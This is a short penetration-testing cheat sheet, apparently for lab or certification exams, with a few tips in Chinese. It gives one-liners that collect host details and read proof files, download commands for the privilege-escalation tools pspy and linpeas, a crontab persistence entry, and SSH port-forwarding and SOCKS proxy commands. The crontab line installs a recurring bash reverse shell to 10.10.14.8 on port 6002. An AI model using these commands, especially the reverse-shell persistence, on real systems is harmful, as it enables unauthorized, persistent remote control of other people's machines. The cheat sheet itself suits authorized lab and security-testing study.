# Proof

_Linux_

```bash
echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a;echo " ";echo "proof:";cat /root/proof.txt 2>/dev/null; cat /Desktop/proof.txt 2>/dev/null;echo " "
```

_Windows_

```powershell
 echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: &  type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
```


# Privilege Escalation

tips1: pspy发现的定时任务命令，可以用grep搜索一下，可能隐藏在某个脚本文件中。
tips2: 查看ls命令借助--full-time这个flag可以判断哪些文件，人为修改过
tips3: tmux session attach

# Download Tool
pspy64
```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
```

pspy32
```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32
```

linpeas
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```
# Persistence

_Crontab_

```bash
(crontab -l ; echo "*/3 * * * *   	/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.8/6002 0>&1'")|crontab 2> /dev/null
```

# Port Forward

## SSH

```bash
# local port forwarding

# the target host 192.168.0.100 is running a service on port 8888

# and you want that service available on the localhost port 7777

ssh -L 7777:localhost:8888 user@192.168.0.100

# remote port forwarding

# you are running a service on localhost port 9999

# and you want that service available on the target host 192.168.0.100 port 12340

ssh -R 12340:localhost:9999 user@192.168.0.100

# Local proxy through remote host

# You want to route network traffic through a remote host target.host

# so you create a local socks proxy on port 12001 and configure the SOCKS5 settings to localhost:12001

ssh -C2qTnN -D 12001 user@target.host
```